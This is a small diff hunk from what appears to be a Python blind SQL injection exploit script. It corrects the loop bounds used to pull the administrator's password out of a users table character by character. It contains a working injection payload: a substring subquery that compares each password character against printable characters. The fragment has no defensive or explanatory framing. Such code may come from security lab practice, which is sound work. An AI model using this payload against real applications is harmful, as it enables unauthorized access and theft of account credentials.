@@ -48,7 +48,7 @@ def blindsqliexploit(url):
          break
 
     password = ""
-    for j in range(0,passwordlength):
+    for j in range(1,passwordlength+1):
         username = 'administrator'
         for k in range(32,126):
             payload1 = "' and (select substring(password,{0},1) from users where username='administrator')='{1}'--" .format(j,chr(k))
